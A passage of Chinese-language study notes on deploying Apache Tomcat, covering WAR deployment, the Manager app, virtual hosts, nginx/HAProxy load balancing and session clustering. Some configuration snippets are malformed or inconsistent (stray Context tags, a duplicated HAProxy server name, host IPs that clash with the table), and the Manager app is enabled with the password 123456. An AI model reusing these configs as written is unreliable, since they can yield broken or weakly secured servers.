Context 定义应用程序单独的路径映射和配置





#2.多个组件关系conf/server.xml
<?xml version="1.0" encoding="UTF-8"?>
<Server port="8005" shutdown="SHUTDOWN">
  <Service name="Catalina">
    <Connector port="8080" protocol="HTTP/1.1"connectionTimeout="20000"
               redirectPort="8443" />
    <Connector port="8009" protocol="AJP/1.3" redirectPort="8443" />
    <Engine name="Catalina" defaultHost="localhost">
     <Host name="localhost"  appBase="webapps" unpackWARs="true"
autoDeploy="true">
         <Context >
         <Context />
     </Host>
    </Engine>
  </Service>
</Server>
```

##### 44.3.3.4 tomcat处理请求过程

```
假设来自客户的请求为：http://localhost:8080/test/index.jsp

浏览器端的请求被发送到服务端端口8080，Tomcat进程监听在此端口上。通过侦听的HTTP/1.1 Connector获得此请求。
Connector把该请求交给它所在的Service的Engine来处理，并等待Engine的响应
Engine获得请求localhost:8080/test/index.jsp，遍历它所有虚拟主机Host
Engine匹配到名为localhost的Host。如果匹配不到,就把请求交给该Engine中的defaultHost处理
localhost Host获得请求/test/index.jsp，匹配它所拥有的所有Context
Host匹配到路径为/test的Context
path=/test的Context获得请求index.jsp，在它的mapping table中寻找对应的servlet
Context匹配到URL PATTERN为 *.jsp 的servlet，对应于JspServlet类构造HttpServletRequest对象和HttpServletResponse对象，作为参数调用JspServlet的doGet或doPost方法。
Context把执行完了之后的HttpServletResponse对象返回给Host
Host把HttpServletResponse对象返回给Engine
Engine把HttpServletResponse对象返回给Connector
Connector把HttpServletResponse对象返回给浏览器端
```

### 44.4 单机应用部署

#### 44.4.1 网页乱码问题

```
#修改网页指定编码
#指定utf-8字符集
[root@centos8 ~]#cat /usr/local/tomcat/webapps/ROOT/index.html
<html>
<head>
<meta http-equiv=Content-Type content="text/html;charset=utf-8">
<title>tomcat</title>
</head>
<h1>刘大大 真帅</h1>
```

![1657294148063](linux体系.assets/1657294148063.png)

#### 44.4.2 JSP WebApp目录结构

```
$CATALINA_BASE/webapps下面的每个目录对应的WebApp,可能有以下子目录,但下面子目录是非必须的
主页配置：默认按以下顺序查找主页文件 index.html，index.htm、index.jsp
    WEB-INF/：当前目录WebApp的私有资源路径，通常存储当前应用使用的web.xml和context.xml配置文件
    META-INF/：类似于WEB-INF，也是私有资源的配置信息，和WEB-INF/目录一样浏览器无法访问
    classes/：类文件，当前webapp需要的类
    lib/：当前应用依赖的jar包
```

####  44.4.3 主页设置

##### 44.4.3.1 全局配置实现修改默认主页文件

```
#1.优先级
默认情况下 tomcat 会在$CATALINA_BASE/webapps/ROOT/目录下按以下次序查找文件,找到第一个则进行显示
   index.html
   index.htm
   index.jsp
可以通过修改 $CATALINA_BASE/conf/web.xml 中的下面<welcome-file-list>标签 内容修改默认页文件




#2.范例: 修改默认主页文件
[root@centos8 ~]# vim /usr/local/tomcat/conf/web.xml
    <welcome-file-list>
        <welcome-file>index.html</welcome-file>
        <welcome-file>index.htm</welcome-file>
        <welcome-file>index.jsp</welcome-file>
    </welcome-file-list>

</web-app>
```

##### 44.4.3.2  WebApp的专用配置文件

```
#1.概述
将上面主配置文件conf/web.xml中的 <welcome-file-list>标签 内容，复制到/usr/local/tomcat/webapps/ROOT/WEB-INF/web.xml中。




#2.针对特定APP目录设置专用配置文件
[root@centos8 ~]# cd /usr/local/tomcat/webapps/
[root@centos8 webapps]# mkdir blog
[root@centos8 blog]# cp -r /usr/local/tomcat/webapps/ROOT/WEB-INF/ /usr/local/tomcat/webapps/blog/


#2.1修改优先级次序
[root@centos8 blog]# vim WEB-INF/web.xml
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd"
  version="3.1"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

  <welcome-file-list>
      <welcome-file>index.jsp</welcome-file>   #jsp文件优先级第一
      <welcome-file>index.html</welcome-file>
      <welcome-file>index.htm</welcome-file>
   </welcome-file-list>
</web-app>
[root@centos8 blog]# pwd
/usr/local/tomcat/webapps/blog
[root@centos8 blog]# chown -R tomcat.tomcat .
[root@centos8 blog]# ll
total 12
-rw-r--r-- 1 tomcat tomcat  18 Jul  9 09:06 index.htm
-rw-r--r-- 1 tomcat tomcat  19 Jul  9 09:06 index.html
-rw-r--r-- 1 tomcat tomcat 397 Sep  1  2021 index.jsp
drwxr-x--- 2 tomcat tomcat  21 Jul  9 09:11 WEB-INF
```

**配置规则**：

```
webApp的专有配置优先于系统的全局配置
修改系统的全局配置文件，需要重新启动服务生效
修改 webApp的专有配置，无需重启即可生效
```

![1657329290646](linux体系.assets/1657329290646.png)

#### 44.4.4 应用部署实现

##### 44.4.4.1 部署方式

```
#1.概述
传统应用开发测试后，通常打包为war格式，这种文件部署到Tomcat的webapps目录下，并默认会自动解包展开和部署上线。

[root@centos8 ~]# vim /usr/local/tomcat/conf/server.xml
<Host name="localhost"  appBase="webapps"
      unpackWARs="true" autoDeploy="true">





#2.部署方式
部署Deploy：将webapp的源文件放置到目标目录，通过web.xml和context.xml文件中配置的路径就可以访问该webapp，通过类加载器加载其特有的类和依赖的类到JVM上，即：最终用户可以通过浏览器访问该应用

   自动部署：Tomcat一旦发现多了一个web应用APP.war包，默认会自动把它解压缩，加载并启动起来
   手动部署
      冷部署：将webapp放到指定目录，才去启动Tomcat服务
      热部署：Tomcat服务不停止，需要依赖manager、ant脚本、tcd（tomcat client deployer）等工具
      
反部署undeploy：停止webapp运行，并从JVM上清除已经加载的类，从Tomcat应用目录中移除部署的文件

启动start：是webapp能够访问
停止stop：webapp不能访问，不能提供服务，但是JVM并不清除它
```

##### 44.4.4.2 自动的应用部署war包

```
#1.制作应用的war包文件
[root@centos8 ~]# cd /data/
[root@centos8 data]# mkdir app1
[root@centos8 data]# cd app1/

#制作html文件
[root@centos8 app1]# vim test.html
<h1> this is test.html </h1>

#制作jsp文件
[root@centos8 app1]# vim test.jsp 
<%@ page language="java" contentType="text/html; charset=UTF-8"
    pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>jsp例子</title>
</head>
<body>
后面的内容是服务器端动态生成字符串，最后拼接在一起
<%
out.println("hello jsp");
%>
</body>
</html>
[root@centos8 data]# tree app1/
app1/
├── test.html
└── test.jsp

0 directories, 2 files


#文件打包到/root下，此文件的名称决定了tomcat子目录的名称
[root@centos8 app1]# jar cvf /root/app1.war *





#2.自动应用部署上面的war包
#会自动解开war包，也就实现了自动上线
[root@centos8 ~]# cp app1.war /usr/local/tomcat/webapps/
[root@centos8 ~]# ll /usr/local/tomcat/webapps/
total 8
drwxr-x---  3 tomcat tomcat   55 Jul  9 10:19 app1
-rw-r--r--  1 root   root    863 Jul  9 10:19 app1.war
drwxr-xr-x  3 tomcat tomcat   73 Jul  9 09:07 blog
drwxr-x--- 15 tomcat tomcat 4096 Jul  8 18:39 docs
drwxr-x---  7 tomcat tomcat   99 Jul  8 18:39 examples
drwxr-x---  6 tomcat tomcat   79 Jul  8 18:39 host-manager
drwxr-x---  6 tomcat tomcat  114 Jul  8 18:39 manager
drwxr-x---  3 tomcat tomcat  241 Jul  8 23:25 ROOT

#删除war包 也就实现了自动下线
[root@centos8 ~]# rm -rf /usr/local/tomcat/webapps/app1.war
[root@centos8 ~]# ll /usr/local/tomcat/webapps/
total 4
drwxr-xr-x  3 tomcat tomcat   73 Jul  9 09:07 blog
drwxr-x--- 15 tomcat tomcat 4096 Jul  8 18:39 docs
drwxr-x---  7 tomcat tomcat   99 Jul  8 18:39 examples
drwxr-x---  6 tomcat tomcat   79 Jul  8 18:39 host-manager
drwxr-x---  6 tomcat tomcat  114 Jul  8 18:39 manager
drwxr-x---  3 tomcat tomcat  241 Jul  8 23:25 ROOT
```

##### 44.4.4.3 部署基于JAVA的博客系统 JPress

```
#在我的网站上下载jpress源码包
[root@centos8 ~]# wget http://liusenbiao.cn/download/java/jpress-v4.0.7.war
[root@centos8 ~]# cp jpress-v4.0.7.war /usr/local/tomcat/webapps/
[root@centos8 ~]# ln -s /usr/local/tomcat/webapps/jpress-v4.0.7 /usr/local/tomcat/webapps/jpress
[root@centos8 ~]# ll /usr/local/tomcat/webapps/
total 68836
drwxr-xr-x  3 tomcat tomcat       73 Jul  9 09:07 blog
drwxr-x--- 15 tomcat tomcat     4096 Jul  8 18:39 docs
drwxr-x---  7 tomcat tomcat       99 Jul  8 18:39 examples
drwxr-x---  6 tomcat tomcat       79 Jul  8 18:39 host-manager
lrwxrwxrwx  1 root   root         39 Jul  9 10:37 jpress -> /usr/local/tomcat/webapps/jpress-v4.0.7
drwxr-x---  6 tomcat tomcat       86 Jul  9 10:35 jpress-v4.0.7
-rw-r--r--  1 root   root   70483256 Jul  9 10:35 jpress-v4.0.7.war
drwxr-x---  6 tomcat tomcat      114 Jul  8 18:39 manager
drwxr-x---  3 tomcat tomcat      241 Jul  8 23:25 ROOT
```

![1657334724713](linux体系.assets/1657334724713.png)

##### 44.4.4.4 基于Server status和Manager APP实现应用部署

![1657335492822](linux体系.assets/1657335492822.png)

```
#默认的管理页面被禁用，启用方法如下
#修改conf/conf/tomcat-users.xml

#1.修改tomcat-users.xml 
[root@centos8 ROOT]# vim  /usr/local/tomcat/conf/tomcat-users.xml 
#下滑到最后一页，把下面代码填进去
<role rolename="manager-gui"/>
<role rolename="admin-gui"/>
<user username="tomcat" password="123456" roles="manager-gui,admin-gui"/>


[root@centos8 META-INF]#  vim  /usr/local/tomcat/webapps/host-manager/META-INF/context.xml
<Context antiResourceLocking="false" privileged="true" >
  <CookieProcessor className="org.apache.tomcat.util.http.Rfc6265CookieProcessor"
                   sameSiteCookies="strict" />
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1|10\.0\.0\.\d+" />
  <Manager sessionAttributeValueClassNameFilter="java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap"/>
</Context>





#2.修改context.xml
[root@centos8 META-INF]# vim /usr/local/tomcat/webapps/manager/META-INF/context.xml

<?xml version="1.0" encoding="UTF-8"?>
<!--
  Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<Context antiResourceLocking="false" privileged="true" >
  <CookieProcessor className="org.apache.tomcat.util.http.Rfc6265CookieProcessor"
                   sameSiteCookies="strict" />
  <Valve className="org.apache.catalina.valves.RemoteAddrValve"
         allow="127\.\d+\.\d+\.\d+|::1|0:0:0:0:0:0:0:1|10\.0\.0\.\d+" />    #添加这一行
  <Manager sessionAttributeValueClassNameFilter="java\.lang\.(?:Boolean|Integer|Long|Number|String)|org\.apache\.catalina\.filters\.CsrfPreventionFilter\$LruCache(?:\$1)?|java\.util\.(?:Linked)?HashMap"/>
</Context>
[root@centos8 META-INF]# systemctl restart tomcat
```

![1657337144787](linux体系.assets/1657337144787.png)

![1657337165115](linux体系.assets/1657337165115.png)

![1657338115370](linux体系.assets/1657338115370.png)

##### 44.4.4.5 端口8005/tcp 安全配置管理

```
#关闭8005端口，因为在生产中别人可以通过扫描8005端口进行连接然后发送SHUTDOWN指令关闭你的服务，所以生产中要把8005端口进行关闭，此管理功能建议禁用，可将SHUTDOWN改为一串猜不出的字符串实现或者port修改成 0, 会使用随机端口,如:36913，或者port设为-1 等无效端口,将关闭此功能此行不能被注释,否则无法启动tomcat服务。



#案例
[root@centos8 META-INF]# vim /usr/local/tomcat/conf/server.xml
<Server port="-1" shutdown="SHUTDOWN">
  <Listener className="org.apache.catalina.startup.VersionLoggerListener" />
[root@centos8 META-INF]# systemctl restart tomcat
```

##### 44.4.4.6 显示指定的http服务器版本信息

```
#1.概述
默认不显示tomcat的http的Server头信息, 可以指定tomcat的http的Server头信息为相应的值



#2.案例
[root@centos8 META-INF]# vim /usr/local/tomcat/conf/server.xml
<Connector port="8080" protocol="HTTP/1.1"
     connectionTimeout="20000"
     redirectPort="8443" Server="LiuServer"/>
[root@centos8 META-INF]# systemctl restart tomcat


#访问报文头
[root@pxc2 ~]# curl -I http://10.0.0.8:8080
HTTP/1.1 200 
Content-Type: text/html;charset=UTF-8
Transfer-Encoding: chunked
Date: Sat, 09 Jul 2022 03:59:50 GMT
Server: LiuServer
```

##### 44.4.4.6 多虚拟主机配置

```
#1.多虚拟主机配置说明
name 必须是主机名，用主机名来匹配
appBase 当前主机的网页根目录，是相对于 $CATALINA_HOME，也可以使用绝对路径
unpackWARs 是否自动解压war格式
autoDeploy 热部署，自动加载并运行应用



#2.案例

#2.1创建三个门户网站
[root@centos8 ~]# mkdir /data/website{1,2,3}/ROOT -pv
[root@centos8 data]# echo www.a.com website1 > /data/website1/ROOT/index.html
[root@centos8 data]# echo www.b.com website2 > /data/website2/ROOT/index.html
[root@centos8 data]# echo www.c.com website3 > /data/website3/ROOT/index.html


#2.2 修改server.xml
[root@centos8 data]# vim /usr/local/tomcat/conf/server.xml
      #配置多虚拟主机
      <Host name="www.a.com"  appBase="/data/website1"
            unpackWARs="true" autoDeploy="true">
      </Host>

      <Host name="www.b.com"  appBase="/data/website2"
            unpackWARs="true" autoDeploy="true">
      </Host>

      <Host name="www.c.com"  appBase="/data/website3"
            unpackWARs="true" autoDeploy="true">
      </Host>
      
    #修改端口号
    <Connector port="80" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443" Server="LiuServer"/>

[root@centos8 data]# vim /usr/lib/systemd/system/tomcat.service
[Unit]
Description=Tomcat
#After=syslog.target network.target remote-fs.target nss-lookup.target
After=syslog.target network.target

[Service]
Type=forking
EnvironmentFile=/usr/local/tomcat/conf/tomcat.conf
ExecStart=/usr/local/tomcat/bin/startup.sh
ExecStop=/usr/local/tomcat/bin/shutdown.sh
RestartSec=3
PrivateTmp=true
#User=tomcat   #添加注释修改端口号
#Group=tomcat  #添加注释修改端口号

[Install]
WantedBy=multi-user.target

[root@centos8 data]# systemctl daemon-reload
[root@centos8 data]# systemctl restart tomcat


#3.查看tomcat错误日志
[root@centos8 META-INF]# tail -f /usr/local/tomcat/logs/catalina.out
```

![1657340911352](linux体系.assets/1657340911352.png)

![1657340928086](linux体系.assets/1657340928086.png)

![1657340947811](linux体系.assets/1657340947811.png)



##### 44.4.4.7 Context 配置

```
#1.Context作用
    路径映射：将url映射至指定路径，而非使用appBase下的物理目 录，实现虚拟目录功能
    应用独立配置，例如单独配置应用日志、单独配置应用访问控制
    
    
    
#2.案例
#2.1创建test目录
[root@centos8 ~]# mkdir /data/website1/test
[root@centos8 ~]# echo this is test html > /data/website1/
ROOT/ test/ 
[root@centos8 ~]# echo this is test html > /data/website1/test/index.html






#2.更换路径
[root@centos8 META-INF]# mkdir /data/test
[root@centos8 META-INF]# echo this is changed index html > /data/test/index.html





#3.Context进行路径映射
[root@centos8 data]# vim       <Host name="www.a.com"  appBase="/data/website1"
            unpackWARs="true" autoDeploy="true">
        <Context path="/test" docBase="/data/test" reloadable="true" />   #添加这行进行路径映射
      </Host>
  
[root@centos8 ~]# systemctl restart tomcat
```

**没有映射前的路径**

![1657342729158](linux体系.assets/1657342729158.png)

**利用Context映射后的路径**

![1657343242506](linux体系.assets/1657343242506.png)

### 44.5 集群应用部署

#### 44.5.1 常见部署架构

![1657355991276](linux体系.assets/1657355991276.png)

#### 44.5.2 利用nginx实现全部转发置指定同一个虚拟主机

![1657356872455](linux体系.assets/1657356872455.png)

**10.0.0.18**

```
#做nginx服务器
#1.修改配置文件
root@proxy:~#  yum -y install nginx
root@proxy:~#  vim /etc/nginx/nginx.conf
http {
                      '$status $body_bytes_sent "$http_referer" '
                      '"$http_user_agent" "$http_x_forwarded_for"';

    access_log  /var/log/nginx/access.log  main;

    sendfile            on;
    tcp_nopush          on;
    tcp_nodelay         on;
    keepalive_timeout   65;
    types_hash_max_size 2048;

    include             /etc/nginx/mime.types;
    default_type        application/octet-stream;

    # Load modular configuration files from the /etc/nginx/conf.d directory.
    # See http://nginx.org/en/docs/ngx_core_module.html#include
    # for more information.
    include /etc/nginx/conf.d/*.conf;

    server {
        listen       80 default_server;
        listen       [::]:80 default_server;
        server_name  _;
        root         /usr/share/nginx/html;

        # Load configuration files for the default server block.
        include /etc/nginx/default.d/*.conf;

        location / {
           proxy_pass http://www.a.com:8080;  #添加这行
        }
        
        location ~* \.jsp$ {  #实现动静分离   
           proxy_pass http://www.a.com:8080;
         }

}




#2.做域名解析
root@proxy:~#  vim /etc/hosts
10.0.0.8 www.a.com www.b.com www.c.com




#3.重启服务
root@proxy:~# nginx -t
nginx: the configuration file /etc/nginx/nginx.conf syntax is ok
nginx: configuration file /etc/nginx/nginx.conf test is successful
root@proxy:~# systemctl restart nginx
```

**10.0.0.8**

```
#实现多虚拟主机
#1.多虚拟主机配置说明
name 必须是主机名，用主机名来匹配
appBase 当前主机的网页根目录，是相对于 $CATALINA_HOME，也可以使用绝对路径
unpackWARs 是否自动解压war格式
autoDeploy 热部署，自动加载并运行应用



#2.案例

#2.1创建三个门户网站
[root@centos8 ~]# mkdir /data/website{1,2,3}/ROOT -pv
[root@centos8 data]# echo www.a.com website1 > /data/website1/ROOT/index.html
[root@centos8 data]# echo www.b.com website2 > /data/website2/ROOT/index.html
[root@centos8 data]# echo www.c.com website3 > /data/website3/ROOT/index.html


#2.2 修改server.xml
[root@centos8 data]# vim /usr/local/tomcat/conf/server.xml
      #配置多虚拟主机
      <Host name="www.a.com"  appBase="/data/website1"
            unpackWARs="true" autoDeploy="true">
      </Host>

      <Host name="www.b.com"  appBase="/data/website2"
            unpackWARs="true" autoDeploy="true">
      </Host>

      <Host name="www.c.com"  appBase="/data/website3"
            unpackWARs="true" autoDeploy="true">
      </Host>
      
    #修改端口号(暂时不动，用原来的8080端口)
    <Connector port="80" protocol="HTTP/1.1"
               connectionTimeout="20000"
               redirectPort="8443" Server="LiuServer"/>

[root@centos8 data]# vim /usr/lib/systemd/system/tomcat.service
[Unit]
Description=Tomcat
#After=syslog.target network.target remote-fs.target nss-lookup.target
After=syslog.target network.target

[Service]
Type=forking
EnvironmentFile=/usr/local/tomcat/conf/tomcat.conf
ExecStart=/usr/local/tomcat/bin/startup.sh
ExecStop=/usr/local/tomcat/bin/shutdown.sh
RestartSec=3
PrivateTmp=true
#User=tomcat   #添加注释修改端口号
#Group=tomcat  #添加注释修改端口号

[Install]
WantedBy=multi-user.target

[root@centos8 data]# systemctl daemon-reload
[root@centos8 data]# systemctl restart tomcat





#3.创建jsp文件实现nginx动静分离
[root@centos8 ROOT]# cd /data/website1/ROOT

#编写动态文件
[root@centos8 ROOT]# cat index.jsp 
<%@ page import="java.util.*" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>tomcat test</title>
</head>
<body>
<h1> Tomcat Website </h1>
<div>On  <%=request.getServerName() %></div>
<div><%=request.getLocalAddr() + ":" + request.getLocalPort() %></div>
<div>SessionID = <span style="color:blue"><%=session.getId() %></span></div>
<%=new Date()%>
</body>
</html>

#编写静态文件
[root@centos8 ROOT]# cat index.html 
www.a.com website1





#4.查看tomcat错误日志
[root@centos8 META-INF]# tail -f /usr/local/tomcat/logs/catalina.out
```

**10.0.0.7**

```
#作为客户端
[17:34:10 root@centos7 ~]#vim /etc/hosts
10.0.0.18  www.a.com www.b.com www.c.com



#测试访问www.a.com
#说明: proxy_pass http://FQDN/ 中的FQDN 决定转发至后端哪个虚拟主机,而与用户请求的URL无关
[17:51:51 root@centos7 ~]#curl www.a.com
www.a.com website1
[17:52:38 root@centos7 ~]#curl www.b.com
www.a.com website1
[17:52:40 root@centos7 ~]#curl www.c.com
www.a.com website1
```

**访问静态文件**

![1657363342295](linux体系.assets/1657363342295.png)

**访问动态文件**

![1657364669845](linux体系.assets/1657364669845.png)

#### 44.5.3 实现tomcat负载均衡

```
动态服务器的问题，往往就是并发能力太弱，往往需要多台动态服务器一起提供服务。如何把并发的压力分摊，这就需要调度，采用一定的调度策略，将请求分发给不同的服务器，这就是Load Balance负载均衡。

当单机Tomcat，演化出多机多级部署的时候，一个问题便凸显出来，这就是Session。而这个问题的由来，都是由于HTTP协议在设计之初没有想到未来的发展。
```

![1657366776583](linux体系.assets/1657366776583.png)

**环境准备**

| IP        | 主机名  | 服务    | 软件          |
| --------- | ------- | ------- | ------------- |
| 10.0.0.8  | proxy   | 调度器  | Nginx、HTTPD  |
| 10.0.0.18 | tomcat1 | tomcat1 | JDK8、Tomcat8 |
| 10.0.0.28 | tomcat2 | tomcat2 | JDK8、Tomcat8 |

**10.0.0.8**

```
#1.设置nginx反向代理
root@proxy:~# vim /etc/nginx/nginx.conf
http {
    upstream tomcat {
       #ip_hash;    #方法一：源地址哈希保存session信息
       #hash $cookie_JSESSIONID; #方法二：开启cookie
       server 10.0.0.18:8080;
       server 10.0.0.28:8080;
    }
    location / {
       proxy_pass http://tomcat;
   }
}
root@proxy:~# systemctl restart nginx





#2.配置host文件
root@proxy:~# vim /etc/hosts
127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
10.0.0.8 www.a.com www.b.com www.c.com tomcat1
10.0.0.28 tomcat2






#3.用Haproxy进行负载均衡
root@proxy:~# systemctl stop nginx
root@proxy:~# yum -y install haproxy
root@proxy:~# vim /etc/haproxy/haproxy.cfg
#---------------------------------------------------------------------
# main frontend which proxys to the backends
#---------------------------------------------------------------------
listen liu_tomcat_80
   bind 10.0.0.18:80
   server tomcat1 10.0.0.8:8080 check
   server tomcat1 10.0.0.28:8080 check
root@proxy:~# systemctl restart haproxy.service
```

![1657369760198](linux体系.assets/1657369760198.png)

**10.0.0.18**

```
#1.创建jsp文件
[root@tomcat1 ~]# mkdir /data/webapps/ROOT -pv
[root@tomcat1 ~]# chown -R tomcat.tomcat /data/webapps/ROOT/
[root@tomcat1 ROOT]# vim /data/webapps/ROOT/index.jsp
[root@tomcat1 ROOT]# cat /data/webapps/ROOT/index.jsp
<%@ page import="java.util.*" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>tomcat test</title>
</head>
<body>
<h1> Tomcat1 Website </h1>
<div>On  <%=request.getServerName() %></div>
<div><%=request.getLocalAddr() + ":" + request.getLocalPort() %></div>
<div>SessionID = <span style="color:blue"><%=session.getId() %></span></div>
<%=new Date()%>
</body>
</html>



#2.配置多虚拟主机
[root@tomcat1 ~]# vim /usr/local/tomcat/conf/server.xml
<Engine name="Catalina" defaultHost="www.liusenbiao.org">
  <Host name="www.liusenbiao.org"  appBase="/data/webapps"
        unpackWARs="true" autoDeploy="true">
   </Host>
[root@tomcat1 ~]# systemctl restart tomcat.servic
```

**10.0.0.28**

```
#1.创建jsp文件
[root@tomcat2 ~]# mkdir /data/webapps/ROOT -pv
[root@tomcat2 ROOT]# vim /data/webapps/ROOT/index.jsp
[root@tomcat2 ROOT]# cat /data/webapps/ROOT/index.jsp
<%@ page import="java.util.*" %>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>tomcat test</title>
</head>
<body>
<h1> Tomcat1 Website </h1>
<div>On  <%=request.getServerName() %></div>
<div><%=request.getLocalAddr() + ":" + request.getLocalPort() %></div>
<div>SessionID = <span style="color:blue"><%=session.getId() %></span></div>
<%=new Date()%>
</body>
</html>




#2.配置多虚拟主机
[root@tomcat2 ~]# vim /usr/local/tomcat/conf/server.xml
#<Engine name="Catalina" defaultHost="localhost">
  <Host name="tomcat"  appBase="/data/webapps"   #要和nginx中定义的upstream后的名称保持一致，也能实现调度
      unpackWARs="true" autoDeploy="true">
   </Host>
[root@tomcat1 ~]# systemctl restart tomcat.service
```

**Nginx负载均衡成功！！！**

![1657370547380](linux体系.assets/1657370547380.png)

![1657370561623](linux体系.assets/1657370561623.png)

#### 44.5.4 Tomcat Session复制集群

![1657416382799](linux体系.assets/1657416382799.png)

##### 44.5.4.1 配置说明

```
#1.概述
Tomcat 官方实现了 Session的复制集群,将每个Tomcat的Session进行相互的复制同步,从而保证所有Tomcat都有相同的Session信息.



#2.配置说明
官方文档：https://tomcat.apache.org/tomcat-8.5-doc/cluster-howto.html
        <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"
                 channelSendOptions="8">

          <Manager className="org.apache.catalina.ha.session.DeltaManager"
                   expireSessionsOnShutdown="false"
                   notifyListenersOnReplication="true"/>

          <Channel className="org.apache.catalina.tribes.group.GroupChannel">
            <Membership className="org.apache.catalina.tribes.membership.McastService"
                        address="228.0.0.4"  #多播地址范围224.xxx-239.xxx
                        port="45564"  #45564/UDP
                        frequency="500"  #间隔500ms发送
                        dropTime="3000"/> #故障阈值3s
            <Receiver className="org.apache.catalina.tribes.transport.nio.NioReceiver"
                      address="auto"  #监听地址,此项建议修改为当前主机的IP
                      port="4000"  #监听端口
                      autoBind="100"  #如果端口冲突,自动绑定其它端口,范围是4000-4100
                      selectorTimeout="5000"  #自动绑定超时时长5s
                      maxThreads="6"/>  

            <Sender className="org.apache.catalina.tribes.transport.ReplicationTransmitter">
              <Transport className="org.apache.catalina.tribes.transport.nio.PooledParallelSender"/>
            </Sender>
            <Interceptor className="org.apache.catalina.tribes.group.interceptors.TcpFailureDetector"/>
            <Interceptor className="org.apache.catalina.tribes.group.interceptors.MessageDispatchInterceptor"/>
          </Channel>

          <Valve className="org.apache.catalina.ha.tcp.ReplicationValve"
                 filter=""/>
          <Valve className="org.apache.catalina.ha.session.JvmRouteBinderValve"/>

          <Deployer className="org.apache.catalina.ha.deploy.FarmWarDeployer"
                    tempDir="/tmp/war-temp/"
                    deployDir="/tmp/war-deploy/"
                    watchDir="/tmp/war-listen/"
                    watchEnabled="false"/>

          <ClusterListener className="org.apache.catalina.ha.session.ClusterSessionListener"/>
        </Cluster>
```

**配置说明**

```
配置说明
  Cluster 集群配置
  Manager 会话管理器配置
  Channel 信道配置
     Membership 成员判定。使用什么多播地址、端口多少、间隔时长ms、超时时长ms。同一个多播地址和端口认同      属一个组。使用时修改这个多播地址，以防冲突。
     
     Receiver 接收器，多线程接收多个其他节点的心跳、会话信息。默认会从4000到4100依次尝试可用端口
       
     address="auto"，auto可能绑定到127.0.0.1上，所以一定要改为当前主机可用的IPSender 多线程发送器，内      部使用了tcp连接池。
    
     Interceptor 拦截器
  Valve 
     ReplicationValve 检测哪些请求需要检测Session，Session数据是否有了变化，需要启动复制过程
    
  ClusterListener
     ClusterSessionListener 集群session侦听器
    
使用 <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"/>
添加到 <Engine> 所有虚拟主机都可以启用Session复制
添加到 <Host> ，该虚拟主机可以启用Session复制
最后，在应用程序内部启用了才可以使用
```

##### 44.5.4.2 实现Tomcat Session集群

![1657418043882](linux体系.assets/1657418043882.png)

**环境准备**

|    IP     | 主机名  |  服务   |     软件      |
| :-------: | :-----: | :-----: | :-----------: |
| 10.0.0.8  |  proxy  | 调度器  | Nginx、HTTPD  |
| 10.0.0.18 | tomcat1 | tomcat1 | JDK8、Tomcat8 |
| 10.0.0.28 | tomcat2 | tomcat2 | JDK8、Tomcat8 |

**10.0.0.8**

```
#1.设置nginx反向代理
root@proxy:~# vim /etc/nginx/nginx.conf
http {
    upstream tomcat {
       #ip_hash;    #方法一：源地址哈希保存session信息
       #hash $cookie_JSESSIONID; #方法二：开启cookie
       server 10.0.0.18:8080;
       server 10.0.0.28:8080;
    }
    location / {
       proxy_pass http://tomcat;
   }
}
root@proxy:~# systemctl restart nginx
```

**10.0.0.18**

```
#1.配置server.xml信息
[root@tomcat1 ~]# vim /usr/local/tomcat/conf/server.xml
      <Host name="www.liusenbiao.org"  appBase="/data/webapps"
              unpackWARs="true" autoDeploy="true">
       <Cluster className="org.apache.catalina.ha.tcp.SimpleTcpCluster"
                 channelSendOptions="8">

          <Manager className="org.apache.catalina.ha.session.DeltaManager"
                   expireSessionsOnShutdown="false"
                   notifyListenersOnReplication="true"/>

          <Channel className="org.apache.catalina.tribes.group.GroupChannel">
            <Membership className="org.apache.catalina.tribes.membership.McastService"
                        address="228.6.6.6"
                        port="45564"
                        frequency="500"
                        dropTime="3000"/>
            <Receiver className="org.apache.catalina.tribes.transport.nio.NioReceiver"
                      address="10.0.0.18"
                      port="4000"
                      autoBind="100"
                      selectorTimeout="5000"
                      maxThreads="6"/>

            <Sender className="org.apache.catalina.tribes.transport.ReplicationTransmitter">
              <Transport className="org.apache.catalina.tribes.transport.nio.PooledParallelSender"/>
            </Sender>
